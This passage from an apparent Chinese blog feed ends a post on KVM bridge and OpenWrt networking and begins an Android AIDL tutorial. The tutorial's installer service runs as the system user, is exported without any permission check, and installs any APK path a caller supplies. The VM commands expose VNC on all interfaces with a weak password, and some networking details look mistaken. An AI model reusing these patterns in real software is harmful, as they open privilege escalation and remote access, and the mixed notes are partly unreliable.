根据实际情况，设置为yes或no</span><br></pre></td></tr></table></figure><p>在上面的配置中，<code>br0</code>是你要创建的网桥接口，<code>enp1s0</code>是你当前的物理接口。你可以根据需要设置<code>dhcp4</code>为<code>yes</code>或<code>no</code>，以决定是使用DHCP获取IP地址还是使用静态IP地址。</p><p><strong>应用网络配置：</strong> 应用你的网络配置更改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure><p><strong>重启网络服务：</strong> 为了确保网络配置正确生效，可以重启网络服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart systemd-networkd</span><br></pre></td></tr></table></figure><p>现在，你已经创建了一个网桥接口<code>br0</code>，并让它的配置完全等于当前物理接口<code>enp1s0</code>的配置。这样，<code>br0</code>将拥有与<code>enp1s0</code>相同的网络配置，包括IP地址、网关、DNS等。其他设备连接到网桥接口<code>br0</code>时，也将共享相同的网络配置。</p><h3 id="virsh-查看和修改已经定义的网络"><a href="#virsh-查看和修改已经定义的网络" class="headerlink" title="virsh 查看和修改已经定义的网络"></a>virsh 查看和修改已经定义的网络</h3><p>在使用 <code>virsh</code> 命令管理虚拟机网络时，你可以使用以下命令来查看、修改和删除已经定义的网络。</p><p><strong>查看已经定义的网络：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh net-list --all</span><br></pre></td></tr></table></figure><p>这个命令会列出所有已经定义的网络，包括运行中的和未运行的。</p><p><strong>查看指定网络的详细信息：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh net-dumpxml NETWORK_NAME</span><br></pre></td></tr></table></figure><p>将 <code>NETWORK_NAME</code> 替换为你要查看详细信息的网络名称。这个命令会显示指定网络的XML配置信息，包括网络的名称、桥接接口、IP地址池等。</p><p><strong>修改已经定义的网络：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh net-edit NETWORK_NAME</span><br></pre></td></tr></table></figure><p>这个命令会打开一个文本编辑器，允许你直接编辑指定网络的XML配置。你可以根据需要修改网络的属性，然后保存并关闭编辑器。注意，在修改网络配置之后，你需要重新启动网络使修改生效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">virsh net-destroy NETWORK_NAME</span><br><span class="line">virsh net-start NETWORK_NAME</span><br></pre></td></tr></table></figure><p><strong>删除已经定义的网络：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virsh net-undefine NETWORK_NAME</span><br></pre></td></tr></table></figure><p>这个命令会删除指定的网络定义，但不会影响运行中的虚拟机，它们仍然可以继续使用网络。如果要停止运行中的虚拟机使用该网络，你需要在虚拟机配置中修改网络接口。</p><p>注意：在删除网络定义之前，请确保没有任何虚拟机正在使用该网络，否则删除操作可能会导致虚拟机失去网络连接。</p><p>以上是一些常用的 <code>virsh</code> 命令来查看、修改和删除已经定义的网络。请谨慎操作，确保你了解网络配置的影响。如有需要，建议备份网络配置文件以防意外发生。</p><h3 id="让设备能够连上网络"><a href="#让设备能够连上网络" class="headerlink" title="让设备能够连上网络"></a>让设备能够连上网络</h3><p>网桥配置成功后，如果想要设备连接上网络的话，因为前面设置的是静态路由，没有开启DHCP，所以需要手动分配IP地址，我因为没有手动设置IP地址，当时笔记本连接上服务器的网口后依然无法上网，这里也记录一下。</p><p>需要将笔记本的IP地址设置为与网桥在同一子网中。根据你的当前网络配置，网桥<code>br0</code>的IP地址为<code>192.168.6.23</code>，子网掩码为<code>255.255.255.0</code>。</p><p>假设你希望笔记本的IP地址为<code>192.168.6.100</code>，则你可以按照以下步骤在笔记本上进行配置：</p><p><strong>Windows 操作系统：</strong></p><ol><li>打开控制面板，并进入”网络和 Internet”部分。</li><li>点击”网络和共享中心”。</li><li>在左侧导航栏中，点击”更改适配器设置”。</li><li>找到通过网线连接的适配器，通常是”本地连接”或”以太网”适配器。</li><li>右键点击适配器，并选择”属性”。</li><li>在属性窗口中，双击”Internet 协议版本 4 (TCP&#x2F;IPv4)”。</li><li>在”常规”选项卡中，选择”使用下面的 IP 地址”，并输入以下信息：<ul><li>IP 地址：<code>192.168.6.100</code></li><li>子网掩码：<code>255.255.255.0</code></li><li>默认网关：<code>192.168.6.1</code> (这是网桥的网关地址)</li><li>首选 DNS 服务器：<code>8.8.8.8</code> (Google 公共 DNS 服务器)</li><li>备用 DNS 服务器：<code>144.144.144.144</code> (你提供的备用 DNS 服务器)</li></ul></li><li>点击”确定”保存设置。</li></ol><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virt-install --name openwrt --ram 4096 --vcpus 4 --hvm --os-variant=generic --network bridge=br0,model=virtio --graphics vnc,password=123qwe,port=6000,listen=0.0.0.0 --disk path=openwrt-22.03.4-x86-64-generic-ext4-combined.img --import --autostart</span><br></pre></td></tr></table></figure><p> 我通过这个命令生成的openwrt虚拟机中网络似乎并没是我设置我br0网桥，我通过ifconfig查看到openwrt虚拟机的网络仅有一个lan口，这是怎么回事</p><p>问题可能与使用 <code>--import</code> 参数有关。当使用 <code>--import</code> 参数时，<code>virt-install</code> 命令会从现有的镜像文件导入虚拟机，并且不会改变镜像文件中的网络配置。</p><p>因此，如果你导入的镜像文件中的网络配置并没有连接到你指定的 <code>br0</code> 网桥，那么虚拟机启动后默认会继续使用镜像文件中的网络配置，而不会应用你在 <code>virt-install</code> 命令中指定的网络配置。</p><p>为了解决这个问题，你可以采取以下两种方法之一：</p><ol><li><p><strong>在虚拟机启动后手动配置网络：</strong> 在虚拟机启动后，你可以手动配置网络并连接到 <code>br0</code> 网桥。首先，在虚拟机中使用 <code>ifconfig</code> 命令查看网络接口的状态。然后，使用 <code>brctl</code> 命令将虚拟机的网络接口连接到 <code>br0</code> 网桥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brctl addif br0 eth0   # 假设虚拟机的网络接口名称是 eth0</span><br></pre></td></tr></table></figure><p>请注意，这里的虚拟机网络接口名称可能是 <code>eth0</code> 或其他名称，取决于虚拟机中的网络配置。</p></li><li><p><strong>修改镜像文件的网络配置：</strong> 另一种方法是在导入前修改镜像文件中的网络配置，确保虚拟机在导入后使用正确的网络配置。这需要对镜像文件进行修改，涉及到比较复杂的操作，因此需要小心进行，以免导致镜像损坏。</p></li></ol><p>总的来说，使用 <code>--import</code> 参数导入的虚拟机确实会保留原始镜像文件中的网络配置，可能导致网络连接不正确。如果你希望虚拟机使用指定的网络配置，可以尝试手动配置虚拟机的网络连接，或者在导入前修改镜像文件的网络配置。</p><h4 id="虚拟机内的配置方式"><a href="#虚拟机内的配置方式" class="headerlink" title="虚拟机内的配置方式"></a>虚拟机内的配置方式</h4><p>在虚拟机中的 WAN 口通常连接到宿主机的物理网络接口（物理网卡），进而实现虚拟机与外部网络（例如家庭网络或互联网）的通信。这种配置使得虚拟机可以模拟真实的路由器或网关设备，将局域网中的流量转发到外部网络。</p><p>在 KVM 虚拟机中，通常通过创建网桥（bridge）来连接虚拟机的 LAN 口和宿主机的物理网卡。而 WAN 口则直接通过虚拟机的配置与宿主机的物理网卡相连。这样，虚拟机就能够实现与外部网络的通信。</p><p>在你的配置中，你可以尝试将虚拟机的 WAN 口连接到宿主机的物理网卡（例如 enp0s1），类似于以下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plaintextCopy codevirt-install --name openwrt --ram 4096 --vcpus 4 --hvm --os-variant=generic \</span><br><span class="line">--network bridge=br0,model=virtio --network bridge=enp0s1,model=virtio \</span><br><span class="line">--graphics vnc,password=123qwe,port=6000,listen=0.0.0.0 \</span><br><span class="line">--disk path=openwrt-22.03.4-x86-64-generic-ext4-combined.img --import --autostart</span><br></pre></td></tr></table></figure><p>请确保将 <code>enp0s1</code> 替换为你宿主机中实际的物理网卡名称。这样配置后，虚拟机的 LAN 口将连接到宿主机的网桥 <code>br0</code>，而虚拟机的 WAN 口将连接到宿主机的物理网卡 <code>enp0s1</code>，从而实现与外部网络的连接。</p><p>在 OpenWrt 虚拟机中，配置 WAN 口是非常类似于配置物理的 OpenWrt 路由器。你需要打开 <code>/etc/config/network</code> 文件并添加或修改 WAN 口的配置。以下是一般情况下的示例配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plaintextCopy codeconfig interface &#x27;wan&#x27;</span><br><span class="line">    option proto &#x27;dhcp&#x27;  # 使用 DHCP 自动获取 IP 地址</span><br><span class="line">    option ifname &#x27;eth0&#x27;  # WAN 口连接的网卡名称，可能是 eth0 或其他虚拟网卡名称</span><br></pre></td></tr></table></figure><p>如果你的网络环境需要使用静态 IP 配置，可以按照以下方式进行配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">plaintextCopy codeconfig interface &#x27;wan&#x27;</span><br><span class="line">    option proto &#x27;static&#x27;  # 使用静态 IP 配置</span><br><span class="line">    option ifname &#x27;eth0&#x27;  # WAN 口连接的网卡名称，可能是 eth0 或其他虚拟网卡名称</span><br><span class="line">    option ipaddr &#x27;192.168.1.100&#x27;  # 替换为你想要的静态 IP 地址</span><br><span class="line">    option netmask &#x27;255.255.255.0&#x27;  # 根据你的网络配置设置子网掩码</span><br><span class="line">    option gateway &#x27;192.168.1.1&#x27;  # 根据你的网络配置设置网关</span><br><span class="line">    option dns &#x27;8.8.8.8&#x27;  # 根据你的网络配置设置 DNS 服务器</span><br></pre></td></tr></table></figure><p>请注意，<code>eth0</code> 是一个示例网卡名称，实际网卡名称可能是其他的，你可以通过使用 <code>ifconfig</code> 或 <code>ip addr show</code> 命令来查看当前虚拟机中的网络接口名称。确保将 <code>ifname</code> 设置为正确的接口名称。</p><p>完成配置后，保存文件并重启 OpenWrt 虚拟机的网络服务，使新的配置生效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/network restart</span><br></pre></td></tr></table></figure><p>这样，你的 OpenWrt 虚拟机就能够正确连接到宿主机的网桥和物理网络接口，实现与外部网络的通信。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>此时，我在将lan口设置为eth0之后现在确实可以访问网络了，但是我感觉我的软路由配置依旧很模糊。</p><p>上面的笔记基于我在配置网络时和chatgpt的对话整理得到，其中有一些地方可能有误，因为是七月份配置的网络，一直到十月份才整理，期间间隔了很长一段时间。最后的结果是能正常上网，但发现openwrt软路由没有起到我想要的效果，如果是访问外网的话应该是可以实现的，但我的终端都带有clash，其实不怎么需要这样一个软路由，后面就没继续折腾了。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AIDL通信学习</title>
    <link href="/2023/08/21/AIDL%E9%80%9A%E4%BF%A1%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/08/21/AIDL%E9%80%9A%E4%BF%A1%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="0-AIDL介绍"><a href="#0-AIDL介绍" class="headerlink" title="0 AIDL介绍"></a>0 AIDL介绍</h2><p>AIDL是一种用于在不同进程之间进行通信的安卓特定接口描述语言。它允许你定义客户端和服务端之间的接口，以便它们可以在不同的进程中进行跨进程通信（IPC）。这对于开发需要在不同组件或应用之间共享数据和功能的应用程序非常有用。</p><p>在进行AIDL通信时，客户端和服务端 的AIDL必须保证完全一样，包括包名，类名，接口名，及其里面的代码</p><h2 id="1-使用常规方式的Intent绑定进行AIDL通信。"><a href="#1-使用常规方式的Intent绑定进行AIDL通信。" class="headerlink" title="1 使用常规方式的Intent绑定进行AIDL通信。"></a>1 使用常规方式的Intent绑定进行AIDL通信。</h2><h3 id="1-1-Android-Studio-中添加AIDL"><a href="#1-1-Android-Studio-中添加AIDL" class="headerlink" title="1.1 Android Studio 中添加AIDL"></a>1.1 Android Studio 中添加AIDL</h3><p>在 build.gradle 中添加如下后才能利用Android Studio创建AIDL文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">buildFeatures &#123;</span><br><span class="line">    compose true</span><br><span class="line">    // Disable unused AGP features</span><br><span class="line">    buildConfig false</span><br><span class="line">    aidl true</span><br><span class="line">    renderScript false</span><br><span class="line">    resValues false</span><br><span class="line">    shaders false</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建的AIDL文件如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">package com.techvision.aidllearn;</span><br><span class="line"></span><br><span class="line">import com.techvision.aidllearn.InstallationCallback;</span><br><span class="line"></span><br><span class="line">interface IInstallerService &#123;</span><br><span class="line">    void installApk(String apkFilePath, InstallationCallback callback);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-2-创建InstallerService文件"><a href="#1-2-创建InstallerService文件" class="headerlink" title="1.2 创建InstallerService文件"></a>1.2 创建InstallerService文件</h3><p>在InstallerService中实现IInstallerService.aidl提供的接口，并将接口绑定服务</p><p>Service 类是用于执行后台任务的组件，而 onBind() 方法是用于实现绑定式服务（Bound Service）的核心部分</p><p>绑定式服务允许其他组件（如 Activity 或其他 Service）与服务进行连接，以便在应用内部或不同应用之间共享数据和交互。onBind() 方法的主要作用是返回一个实现了 IBinder 接口的对象，这个对象可以用来与绑定到服务的客户端进行通信。</p><p>具体来说，当客户端通过 bindService() 方法来绑定到一个继承自 Service 类的服务时，onBind() 方法会被调用。您需要在 onBind() 方法中返回一个实现了 IBinder 接口的对象，通常是您自定义的继承自 Binder 类的子类对象。客户端可以通过此 IBinder 对象与服务进行通信，调用服务中的方法，获取服务提供的功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">package com.techvision.aidllearn;</span><br><span class="line"></span><br><span class="line">import android.app.Service;</span><br><span class="line">import android.content.Intent;</span><br><span class="line">import android.os.IBinder;</span><br><span class="line">import android.os.RemoteException;</span><br><span class="line">import android.util.Log;</span><br><span class="line"></span><br><span class="line">import androidx.annotation.Nullable;</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class InstallerService extends Service &#123;</span><br><span class="line">    IInstallerService.Stub mBinder = new IInstallerService.Stub() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void installApk(String path, InstallationCallback callback) throws RemoteException &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Log.d(&quot;server&quot;, &quot;installApk: &quot; + path);</span><br><span class="line">                String[] cmd = new String[] &#123;&quot;pm&quot;, &quot;install&quot;,&quot;-i&quot;,&quot;com.techvision.aidllearn&quot;,&quot;--user&quot;, &quot;0&quot;, path&#125;;</span><br><span class="line">//                Process proc = Runtime.getRuntime().exec(cmd);</span><br><span class="line"></span><br><span class="line">                Process proc = new ProcessBuilder().command(cmd).start();</span><br><span class="line"></span><br><span class="line">                BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getErrorStream()));</span><br><span class="line">                String line;</span><br><span class="line">                while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">                    Log.e(&quot;server&quot;, &quot;installApk error: &quot; + line);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                int exitCode = proc.waitFor();</span><br><span class="line">                Log.d(&quot;server&quot;, &quot;installApk: exitCode: &quot; + exitCode);</span><br><span class="line"></span><br><span class="line">                // Notify the callback about the operation result</span><br><span class="line">                if (callback != null) &#123;</span><br><span class="line">                    Log.d(&quot;server&quot;, &quot;installApk: callback != null&quot;);</span><br><span class="line">                    callback.onInstallationCompleted(true, &quot;Installation started.&quot;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    Log.d(&quot;server&quot;, &quot;installApk: callback == null&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                Log.d(&quot;server&quot;, &quot;installApk: error&quot;);</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                callback.onInstallationCompleted(false, &quot;Error starting installation.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    @Nullable</span><br><span class="line">    @Override</span><br><span class="line">    public IBinder onBind(Intent intent) &#123;</span><br><span class="line">        return mBinder;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-3-在AndroidManifest中声明服务"><a href="#1-3-在AndroidManifest中声明服务" class="headerlink" title="1.3 在AndroidManifest中声明服务"></a>1.3 在AndroidManifest中声明服务</h3><p>如果服务需要权限，需要在此文件中添加权限，否则无法执行，且通过日志难以排查（因为权限问题排查了一天）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</span><br><span class="line">    android:sharedUserId=&quot;android.uid.system&quot;&gt;</span><br><span class="line">&lt;!--  此处共享了系统用户ID也需要在下面申请权限，共享系统ID一般和系统签名一起使用  --&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.INSTALL_PACKAGES&quot;</span><br><span class="line">        tools:ignore=&quot;ProtectedPermissions&quot; /&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.FOREGROUND_SERVICE&quot; /&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot; /&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.INTERACT_ACROSS_USERS_FULL&quot;</span><br><span class="line">        tools:ignore=&quot;ProtectedPermissions&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;application</span><br><span class="line">        android:allowBackup=&quot;true&quot;</span><br><span class="line">        android:dataExtractionRules=&quot;@xml/data_extraction_rules&quot;</span><br><span class="line">        android:fullBackupContent=&quot;@xml/backup_rules&quot;</span><br><span class="line">        android:icon=&quot;@mipmap/ic_launcher&quot;</span><br><span class="line">        android:label=&quot;@string/app_name&quot;</span><br><span class="line">        android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;</span><br><span class="line">        android:supportsRtl=&quot;true&quot;</span><br><span class="line">        android:theme=&quot;@style/Theme.AIDLLearn&quot;</span><br><span class="line">        tools:targetApi=&quot;31&quot;&gt;</span><br><span class="line">        &lt;activity</span><br><span class="line">            android:name=&quot;.MainActivity&quot;</span><br><span class="line">            android:exported=&quot;true&quot;&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;</span><br><span class="line"></span><br><span class="line">                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line">        &lt;service android:name=&quot;.InstallerService&quot;</span><br><span class="line">            android:exported=&quot;true&quot;/&gt;</span><br><span class="line">    &lt;/application&gt;</span><br><span class="line"></span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure><h3 id="1-4-编写客户端代码"><a href="#1-4-编写客户端代码" class="headerlink" title="1.4 编写客户端代码"></a>1.4 编写客户端代码</h3><p>客户端中要将服务端所有的AIDL文件拷贝过来</p><p>然后在 MainActivity中通过intent绑定服务即可通过AIDL通信</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">package com.techvision.aidlclient;</span><br><span class="line"></span><br><span class="line">import android.content.ComponentName;</span><br><span class="line">import android.content.Context;</span><br><span class="line">import android.content.Intent;</span><br><span class="line">import android.content.ServiceConnection;</span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import android.os.IBinder;</span><br><span class="line">import android.os.RemoteException;</span><br><span class="line">import android.util.Log;</span><br><span class="line">import android.widget.Button;</span><br><span class="line"></span><br><span class="line">import androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line">import com.techvision.aidllearn.IInstallerService;</span><br><span class="line">import com.techvision.aidllearn.InstallationCallback;</span><br><span class="line"></span><br><span class="line">public class MainActivity extends AppCompatActivity &#123;</span><br><span class="line"></span><br><span class="line">    private IInstallerService myLocalService;</span><br><span class="line">    private boolean isBound = false;</span><br><span class="line"></span><br><span class="line">    private static final String TAG = &quot;hukaichao&quot;;</span><br><span class="line"></span><br><span class="line">    private ServiceConnection serviceConnection = new ServiceConnection() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void onServiceConnected(ComponentName name, IBinder service) &#123;</span><br><span class="line">            Log.d(TAG, &quot;onServiceConnected&quot;);</span><br><span class="line">            myLocalService = IInstallerService.Stub.asInterface(service);</span><br><span class="line">            isBound = true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void onServiceDisconnected(ComponentName name) &#123;</span><br><span class="line">            Log.d(TAG, &quot;onServiceDisconnected&quot;);</span><br><span class="line">            myLocalService = null;</span><br><span class="line">            isBound = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Intent intent = new Intent();</span><br><span class="line">        intent.setComponent(new ComponentName(&quot;com.techvision.aidllearn&quot;, &quot;com.techvision.aidllearn.InstallerService&quot;));</span><br><span class="line">        bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Button sendMessageButton = findViewById(R.id.sendMessageButton);</span><br><span class="line">        sendMessageButton.setOnClickListener(v -&gt; installApk(&quot;/storage/emulated/0/Download/launcherlearn.apk&quot;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void onDestroy() &#123;</span><br><span class="line">        super.onDestroy();</span><br><span class="line">        if (isBound) &#123;</span><br><span class="line">            unbindService(serviceConnection);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void installApk(String command) &#123;</span><br><span class="line">        if (isBound) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Log.d(TAG, &quot;installApk&quot;);</span><br><span class="line">                myLocalService.installApk(command, new InstallationCallback.Stub() &#123;</span><br><span class="line">                    @Override</span><br><span class="line">                    public void onInstallationCompleted(boolean success, String message) &#123;</span><br><span class="line">                        if (success) &#123;</span><br><span class="line">                            Log.d(TAG, &quot;onInstallationCompleted: &quot; + message);</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            Log.d(TAG, &quot;onInstallationCompleted: &quot; + message);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; catch (RemoteException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2，使用ServiceManager系统权限方式的AIDL通信。"><a href="#2，使用ServiceManager系统权限方式的AIDL通信。" class="headerlink" title="2，使用ServiceManager系统权限方式的AIDL通信。"></a>2，使用ServiceManager系统权限方式的AIDL通信。</h2><h3 id="2-1-创建AIDL文件"><a href="#2-1-创建AIDL文件" class="headerlink" title="2.1 创建AIDL文件"></a>2.1 创建AIDL文件</h3><p>主要注意包名</p><p>补丁：<a 